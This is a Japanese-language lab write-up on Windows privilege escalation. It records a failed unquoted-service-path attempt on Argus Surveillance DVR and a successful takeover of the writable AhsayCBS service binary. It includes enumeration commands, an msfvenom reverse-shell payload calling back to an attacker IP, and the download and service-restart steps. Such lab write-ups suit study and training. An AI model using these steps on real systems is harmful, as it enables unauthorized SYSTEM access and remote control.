# Argus surveilance DVR

# Argus surveilance dvr unquoted P.E -> Program Filesが書き込み不可なので失敗

- [Argus Surveillance DVR 4.0 - Unquoted Service Path](https://www.exploit-db.com/exploits/50261)

- Local Systemで動作している、かつ、サービスは囲まれていない
```powershell
*Evil-WinRM* PS C:\Program Files\Argus Surveillance DVR> Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\* |
  Where-Object {
    $_.ObjectName -and
    $_.ObjectName -notmatch 'LocalService|NetworkService' -and
    $_.ImagePath -and
    $_.ImagePath -notmatch '^"?C:\\Windows\\'
    # unquoted service path用
    # $_.PathName -notmatch '"'
  } |
  Select PSChildName, ImagePath, ObjectName

PSChildName                   ImagePath                                                                               ObjectName
-----------                   ---------                                                                               ----------
...
ARGUSSURVEILLANCEDVR_WATCHDOG C:\Program Files\Argus Surveillance DVR\DVRWatchdog.exe                                 LocalSystem
...
```

```powershell
  =================================================================================================

    Argus Surveillance DVR Watchdog(PY Software - Argus Surveillance DVR Watchdog)[C:\Program Files\Argus Surveillance DVR\DVRWatchdog.exe] - Autoload - No quotes and Space detected
    File Permissions: Users [Allow: AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files\Argus Surveillance DVR (Users [Allow: AllAccess])
    This program monitors and automatically reboots Argus Surveillance DVR if it's locked-up.
   =================================================================================================
```

- 


# cbssvcX64.exe の上書き -> sandra になる

- AhsayCBSのサービスが、BUILTIN USERSに(F)アクセスを提供している
```sh
ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Services -non Microsoft-
È Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services                                                                                                     
  [X] Exception: Access denied 
    Ahsay Cloud Backup Suite(Ahsay Cloud Backup Suite)[C:\Program Files\AhsayCBS\bin\cbssvcX64.exe] - Autoload - No quotes and Space detected
    File Permissions: Users [Allow: AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files\AhsayCBS\bin (Users [Allow: AllAccess])
```
```powershell
*Evil-WinRM* PS C:\Program Files\AhsayCBS\bin> icacls cbssvcX64.exe
cbssvcX64.exe BUILTIN\Users:(I)(F)
              NT AUTHORITY\SYSTEM:(I)(F)
              BUILTIN\Administrators:(I)(F)
              APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
              APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
*
```

- しかも、Sandra には再起動権限があるため、サービスを上書き、リロードが可能
```powershell
*Evil-WinRM* PS C:\Program Files\AhsayCBS\bin> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system  Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled
*Evil-WinRM* PS C:\Program Files\AhsayCBS\bin> 
```

- ペイロードの用意
```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.104 LPORT=80 -f exe-service -o cbssvcX64.exe
```

- ターゲットでバックアップを取ったうえでファイルの上書き
```powershell
*Evil-WinRM* PS C:\Program Files\AhsayCBS\bin> mv cbssvcX64.exe ~/cbssvcX64.exe.bkup
*Evil-WinRM* PS C:\Program Files\AhsayCBS\bin> dir ~


    Directory: C:\Users\Sandra


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         2/21/2022   3:12 PM                3D Objects
d-r---         2/21/2022   3:12 PM                Contacts
d-r---         2/22/2022   9:14 AM                Desktop
d-r---         3/15/2023   3:23 AM                Documents
d-r---         2/21/2022   3:12 PM                Downloads
d-r---         2/21/2022   3:12 PM                Favorites
d-r---         2/21/2022   3:12 PM                Links
d-r---         2/21/2022   3:12 PM                Music
d-r---         2/21/2022   3:20 PM                Pictures
d-r---         2/21/2022   3:12 PM                Saved Games
d-r---         2/21/2022   3:20 PM                Searches
d-r---         2/21/2022   3:12 PM                Videos
-a----          4/2/2019  11:24 AM         283720 cbssvcX64.exe.bkup
-a----         2/21/2026   9:45 PM           5463 Watch-Command.ps1
-a----         2/21/2026   9:37 PM       10170880 winPEASx64.exe


*Evil-WinRM* PS C:\Program Files\AhsayCBS\bin> dir


    Directory: C:\Program Files\AhsayCBS\bin


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/23/2022  10:47 AM                WinX64
d-----         2/23/2022  10:47 AM                WinX86
-a----         1/25/2019  11:21 AM            276 browse.bat
-a----          4/2/2019  11:24 AM          30224 CBSServiceController.exe
-a----        11/25/2015   2:11 PM            187 CBSServiceController.exe.config
-a----          4/2/2019  11:24 AM         206408 cbssvcX86.exe
-a----          4/2/2019  11:23 AM           1923 MigrateV6.bat
-a----          4/2/2019  11:23 AM           1723 MigrateV7.bat
-a----          4/2/2019  11:23 AM           2269 shutdown.bat
-a----          4/2/2019  11:23 AM           2799 startup.bat


*Evil-WinRM* PS C:\Program Files\AhsayCBS\bin> iwr -uri http://192.168.49.104:8888/cbssvcX64.exe -OutFile .\cbssvcX64.exe
 
*Evil-WinRM* PS C:\Program Files\AhsayCBS\bin> dir


    Directory: C:\Program Files\AhsayCBS\bin


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/23/2022  10:47 AM                WinX64
d-----         2/23/2022  10:47 AM                WinX86
-a----         1/25/2019  11:21 AM            276 browse.bat
-a----          4/2/2019  11:24 AM          30224 CBSServiceController.exe
-a----        11/25/2015   2:11 PM            187 CBSServiceController.exe.config
-a----         2/21/2026   9:55 PM          12288 cbssvcX64.exe
-a----          4/2/2019  11:24 AM         206408 cbssvcX86.exe
-a----          4/2/2019  11:23 AM           1923 MigrateV6.bat
-a----          4/2/2019  11:23 AM           1723 MigrateV7.bat
-a----          4/2/2019  11:23 AM           2269 shutdown.bat
-a----          4/2/2019  11:23 AM           2799 startup.bat


*Evil-WinRM* PS C:\Program Files\AhsayCBS\bin> 

```

- サービス再起動
```powershell
net stop ahsaycbs
```

```
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'ahsaycbs'}
```